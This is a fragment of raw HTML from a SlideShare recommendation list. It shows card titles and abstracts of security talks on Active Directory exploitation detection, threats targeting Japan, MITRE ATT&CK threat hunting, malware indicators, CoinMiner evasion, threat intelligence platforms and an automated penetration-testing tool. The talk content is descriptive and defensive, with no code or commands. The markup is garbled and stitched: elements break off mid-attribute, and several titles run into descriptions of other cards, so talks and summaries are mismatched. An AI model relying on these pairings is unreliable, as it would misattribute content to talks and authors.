with possible point-of-sale terminals on domain controller. Vitali also presents detection and mitigation methods on how to detect active directory exploitation and discusses defense mechanisms surrounding most popular active methods used in the wild by the sophisticated groups.

</span></div></div><div class="" id=":Rhal4f6:" popover="manual" data-popover-position="bottom-start" style="position-anchor:--popover-Rhal4f6"></div><div class="separator Separator_root__70Ime Separator_horizontal__czVEa" style="--color:var(--blue-gray-200);--size:1px" role="separator"></div><div class="RailCard_root__rZUGY RailCard_hasDescription__MjSgf SlideshowCard_root__pD8t4 slideshow-card" aria-describedby="recommended-card-description-2" aria-haspopup="dialog" aria-controls=":Rhql4f6:" popovertarget=":Rhql4f6:" style="anchor-name:--popover-Rhql4f6"><a class="SlideshowCardLink_root__p8KI7" data-cy="slideshow-card-link" data-testid="slideshow-card-link" href="https://www.slideshare.net/codeblue_jp/cb19-cyber-threat-landscape-in-japan-revealing-threat-in-the-shadow-by-chi-en-shen-ashley-oleg-bondarenko"><span class="sr-only">[CB19] Cyber Threat Landscape in Japan  Revealing Threat in the Shadow by  C...</span></a><div class="slideshow-thumbnail Thumbnail_root__qLW0K SlideshowCard_thumb__86aJk" style="aspect-ratio:1.5;--index:2" data-testid="card-thumbnail"><img class="Thumbnail_thumb__UXO3a Thumbnail_blur__opK6A Thumbnail_cover__1zsIi" alt="[CB19] Cyber Threat Landscape in Japan  Revealing Threat in the Shadow by  C..." Thumbnail_contain__K6M0d" alt="[CB19] Cyber Threat Landscape in Japan  Revealing Threat in the Shadow by  C..." src="https://cdn.slidesharecdn.com/ss_thumbnails/japanthreatlandscape1030final-191212012938-thumbnail.jpg?width=560&amp;fit=bounds" loading="lazy"/></div><div class="SlideshowCard_content__xh7kV slideshow-card-content"><span class="slideshow-title SlideshowTitle_root__2VccW RailCard_title__Tvfiv ellipsis" style="-webkit-line-clamp:2" data-cy="slideshow-title">[CB19] Cyber Threat Landscape in Japan  Revealing Threat in the Shadow by  C...</span><button type="button" class="Button_root__i1yp0 Button_secondary__hHiHI Button_text__ZT_3O Button_small__sqsEx Button_icon__1C4qi" data-testid="button" aria-checked="false" aria-label="Save [CB19] Cyber Threat Landscape in Japan  Revealing Threat in the Shadow by  C... for later" role="switch" aria-haspopup="dialog" aria-controls=":R5mhql4f6:" popovertarget=":R5mhql4f6:" style="anchor-name:--popover-R5mhql4f6"><span class="icon Icon_root__AjZyv RecSaveButton_icon__btwCp" style="--size:24px"><span class="Icon_icon__4zzsG" style="mask-image:url(https://public.slidesharecdn.com/_next/static/media/save.ef1812e2.svg);background-color:currentColor"></span><span class="sr-only"></span></span></button><div class="Tooltip_root__7FS0Y" id=":R5mhql4f6:" popover="manual" data-popover-position="top" style="position-anchor:--popover-R5mhql4f6"></div><a class="SlideshowAuthor_root__IkT1_ RailCard_author__JYeYZ slideshow-author ellipsis" data-testid="slideshow-author" data-cy="slideshow-author" href="https://www.slideshare.net/codeblue_jp">CODE BLUE</a><div class="slideshow-stats SlideshowStats_root__EQOR1 RailCard_stats__ZvZms"></div><span aria-hidden="true" class="seo-only">For the past few years, Asia Pacific and Japan have continued to be a regular target of cyber threat actors. From 2018 to 2019, we have observed several threats targeting Japan involving cyber espionage and underground activities. Some of the adversaries and campaigns are revealed in OSINT, however, some are still lurking in shadow.
In this talk, we will reveal the TTP&#x27;s (tactics, techniques and procedures) of espionage threat actors interested in Japanese electronics, chemical and 5G equipment manufacturing companies. One campaign leverages a malware attributed to APT41, a prolific Chinese cyber threat group that carries out state-sponsored espionage activity in parallel with financially motivated operations. Beside the Chinese actors, we have also observed a group which historically focused on the EMEA region shift to showing interest in Japan. In addition, we will also disclose details of underground activity involving a target in the Japanese financial industry.</span></div></div><div class="" id=":Rhql4f6:" popover="manual" data-popover-position="bottom-start" style="position-anchor:--popover-Rhql4f6"></div><div class="separator Separator_root__70Ime Separator_horizontal__czVEa" style="--color:var(--blue-gray-200);--size:1px" role="separator"></div><div class="RailCard_root__rZUGY RailCard_hasDescription__MjSgf SlideshowCard_root__pD8t4 slideshow-card" aria-describedby="recommended-card-description-3" aria-haspopup="dialog" aria-controls=":Rial4f6:" popovertarget=":Rial4f6:" style="anchor-name:--popover-Rial4f6"><a class="SlideshowCardLink_root__p8KI7" data-cy="slideshow-card-link" data-testid="slideshow-card-link" href="https://www.slideshare.net/attackcon2018/mitre-attackcon-power-hour-december"><span class="sr-only">MITRE ATTACKCon Power Hour - December</span></a><div class="slideshow-thumbnail Thumbnail_root__qLW0K SlideshowCard_thumb__86aJk" style="aspect-ratio:1.5;--index:3" data-testid="card-thumbnail"><img class="Thumbnail_thumb__UXO3a Thumbnail_blur__opK6A Thumbnail_cover__1zsIi" alt="MITRE ATTACKCon Power Hour - December" src="https://cdn.slidesharecdn.com/ss_thumbnails/attckconpowerhourdecemberpresentation-final-201217141543-thumbnail.jpg?width=560&amp;fit=bounds" loading="lazy"/><img class="Thumbnail_thumb__UXO3a Thumbnail_contain__K6M0d" alt="MITRE ATTACKCon Power Hour - December" src="https://cdn.slidesharecdn.com/ss_thumbnails/attckconpowerhourdecemberpresentation-final-201217141543-thumbnail.jpg?width=560&amp;fit=bounds" loading="lazy"/></div><div class="SlideshowCard_content__xh7kV slideshow-card-content"><span class="slideshow-title SlideshowTitle_root__2VccW RailCard_title__Tvfiv ellipsis" style="-webkit-line-clamp:2" data-cy="slideshow-title">MITRE ATTACKCon Power Hour - December</span><button type="button" class="Button_root__i1yp0 Button_secondary__hHiHI Button_text__ZT_3O Button_small__sqsEx Button_icon__1C4qi" data-testid="button" aria-checked="false" aria-label="Save MITRE ATTACKCon Power Hour - December for later" role="switch" aria-haspopup="dialog" aria-controls=":R5mial4f6:" popovertarget=":R5mial4f6:" style="anchor-name:--popover-R5mial4f6"><span class="icon Icon_root__AjZyv RecSaveButton_icon__btwCp" style="--size:24px"><span class="Icon_icon__4zzsG" style="mask-image:url(https://public.slidesharecdn.com/_next/static/media/save.ef1812e2.svg);background-color:currentColor"></span><span class="sr-only"></span></span></button><div class="Tooltip_root__7FS0Y" id=":R5mial4f6:" popover="manual" data-popover-position="top" style="position-anchor:--popover-R5mial4f6"></div><a class="SlideshowAuthor_root__IkT1_ RailCard_author__JYeYZ slideshow-author ellipsis" data-testid="slideshow-author" data-cy="slideshow-author" href="https://www.slideshare.net/attackcon2018">MITRE - ATT&amp;CKcon</a><div class="slideshow-stats SlideshowStats_root__EQOR1 RailCard_stats__ZvZms"></div><span aria-hidden="true" class="seo-only">This document discusses how the MITRE ATT&amp;CK framework can help sharpen a threat hunting program. It begins with distinguishing threat hunting from threat detection, noting that threat hunting is a proactive manual process of searching through systems to identify signs of adversary activity. The document then provides an overview of the MITRE ATT&amp;CK framework and how its tactics and techniques can be used to structure threat hunting searches. It concludes by explaining how the ATT&amp;CK framework helps focus hunting efforts on the specific techniques adversaries are likely using and improves the ability to communicate findings across security teams.</span></div></div><div class="" id=":Rial4f6:" popover="manual" data-popover-position="bottom-start" style="position-anchor:--popover-Rial4f6"></div><div class="separator Separator_root__70Ime Separator_horizontal__czVEa" style="--color:var(--blue-gray-200);--size:1px" role="separator"></div><div class="RailCard_root__rZUGY RailCard_hasDescription__MjSgf SlideshowCard_root__pD8t4 slideshow-card" aria-describedby="recommended-card-description-4" aria-haspopup="dialog" aria-controls=":Riql4f6:" popovertarget=":Riql4f6:" style="anchor-name:--popover-Riql4f6"><a class="SlideshowCardLink_root__p8KI7" data-cy="slideshow-card-link" data-testid="slideshow-card-link" href="https://www.slideshare.net/slideshow/42-malware-understand-the-threat-and-how-to-respond/94831653"><span class="sr-only">42 - Malware - Understand the Threat and How to Respond</span></a><div class="slideshow-thumbnail Thumbnail_root__qLW0K SlideshowCard_thumb__86aJk" style="aspect-ratio:1.5;--index:4" data-testid="card-thumbnail"><img class="Thumbnail_thumb__UXO3a Thumbnail_blur__opK6A Thumbnail_cover__1zsIi" alt="42 - Malware - Understand the Threat and How to Respond</span><button type="button" class="Button_root__i1yp0 Button_secondary__hHiHI Button_text__ZT_3O Button_small__sqsEx Button_icon__1C4qi" data-testid="button" aria-checked="false" aria-label="Save 42 - It outlines the benefits of aggregating data across an organization to improve visibility and detection capabilities. It then describes how indicators can be used for attribution, detection, profiling, and prediction of threats. Various detection options are evaluated like Snort, HIPS, and MIR for their ability to detect scenarios in the kill chain using available indicators.</span></div></div><div class="" id=":Rjql4f6:" class="Tooltip_root__7FS0Y" id=":R5mkal4f6:" popover="manual" data-popover-position="top" style="position-anchor:--popover-R5mkal4f6"></div><a class="SlideshowAuthor_root__IkT1_ RailCard_author__JYeYZ slideshow-author ellipsis" data-testid="slideshow-author" data-cy="slideshow-author" href="https://www.slideshare.net/ThomasRoccia">Thomas Roccia</a><div class="slideshow-stats It presents an overview of the malware evasion techniques</span></div></div><div class="" id=":Rkal4f6:" popover="manual" data-popover-position="bottom-start" style="position-anchor:--popover-Rkal4f6"></div><div class="separator Separator_root__70Ime Separator_horizontal__czVEa" style="--color:var(--blue-gray-200);--size:1px" role="separator"></div><div class="RailCard_root__rZUGY RailCard_hasDescription__MjSgf SlideshowCard_root__pD8t4 slideshow-card" aria-describedby="recommended-card-description-8" aria-haspopup="dialog" aria-controls=":Rkql4f6:" popovertarget=":Rkql4f6:" style="anchor-name:--popover-Rkql4f6"><a class="SlideshowCardLink_root__p8KI7" data-cy="slideshow-card-link" data-testid="slideshow-card-link" href="https://www.slideshare.net/slideshow/coinminers-are-evasive-bsidestlv/102773721"><span class="sr-only">CoinMiners are Evasive - BsidesTLV</span></a><div class="slideshow-thumbnail Thumbnail_root__qLW0K SlideshowCard_thumb__86aJk" style="aspect-ratio:1.5;--index:8" data-testid="card-thumbnail"><img class="Thumbnail_thumb__UXO3a Thumbnail_blur__opK6A Thumbnail_cover__1zsIi" alt="CoinMiners are Evasive - BsidesTLV" src="https://cdn.slidesharecdn.com/ss_thumbnails/coinminersareevasive-180621115946-thumbnail.jpg?width=560&amp;fit=bounds" loading="lazy"/></div><div class="SlideshowCard_content__xh7kV slideshow-card-content"><span class="slideshow-title SlideshowTitle_root__2VccW RailCard_title__Tvfiv ellipsis" style="-webkit-line-clamp:2" data-cy="slideshow-title">CoinMiners are Evasive - BsidesTLV</span><button type="button" class="Button_root__i1yp0 Button_secondary__hHiHI Button_text__ZT_3O Button_small__sqsEx Button_icon__1C4qi" data-testid="button" aria-checked="false" aria-label="Save CoinMiners are Evasive - BsidesTLV for later" role="switch" aria-haspopup="dialog" aria-controls=":R5mkql4f6:" popovertarget=":R5mkql4f6:" style="anchor-name:--popover-R5mkql4f6"><span class="icon Icon_root__AjZyv RecSaveButton_icon__btwCp" style="--size:24px"><span class="Icon_icon__4zzsG" style="mask-image:url(https://public.slidesharecdn.com/_next/static/media/save.ef1812e2.svg);background-color:currentColor"></span><span class="sr-only"></span></span></button><div class="Tooltip_root__7FS0Y" id=":R5mkql4f6:" popover="manual" data-popover-position="top" style="position-anchor:--popover-R5mkql4f6"></div><a class="SlideshowAuthor_root__IkT1_ RailCard_author__JYeYZ slideshow-author ellipsis" data-testid="slideshow-author" data-cy="slideshow-author" href="https://www.slideshare.net/ThomasRoccia">Thomas Roccia</a><div class="slideshow-stats SlideshowStats_root__EQOR1 RailCard_stats__ZvZms"></div><span aria-hidden="true" class="seo-only">CoinMiners are on the rise, trending so high that in the last couple of month they almost completely replaced ransomware in both media and the research community. Unlike ransomware which profit from rapid encryption of users data taken hostage, CoinMiners profit comes from high jacking computer resources. As long as the CoinMiner stays undetected and stealth, the higher its author profit.

In this talk we will focus on the unexplored territory of CoinMiner evasive maneuver and functionality to avoid getting found by its victims and provide tactics and tools to combat them.</span></div></div><div class="" id=":Rkql4f6:" popover="manual" data-popover-position="bottom-start" style="position-anchor:--popover-Rkql4f6"></div><div class="separator Separator_root__70Ime SlideshowStats_root__EQOR1 RailCard_stats__ZvZms"></div><span aria-hidden="true" class="seo-only">The document discusses threat intelligence platforms (TIPs) and leveraging them to defend against cyber attacks. It describes how TIPs aggregate internal and external data from various sources, help manage that information to facilitate analysis, and support turning analyzed intelligence into actionable information. The document then provides an example analysis of the activities of the Menupass cyber espionage group over time as discovered through a TIP.</span></div></div><div class="" id=":Rmal4f6:" popover="manual" data-popover-position="bottom-start" style="position-anchor:--popover-Rmal4f6"></div><div class="separator Separator_root__70Ime Separator_horizontal__czVEa" aria-describedby="recommended-card-description-12" aria-haspopup="dialog" aria-controls=":Rmql4f6:" popovertarget=":Rmql4f6:" style="anchor-name:--popover-Rmql4f6"><a Automatic Penetration Test Tool Using Reinforcemen...</span></a><div class="slideshow-thumbnail Thumbnail_root__qLW0K SlideshowCard_thumb__86aJk" style="aspect-ratio:1.5;--index:12" data-testid="card-thumbnail"><img class="Thumbnail_thumb__UXO3a Thumbnail_blur__opK6A Thumbnail_cover__1zsIi" alt="[CB19] Deep Exploit: Fully Automatic Penetration Test Tool Using Reinforcemen..."
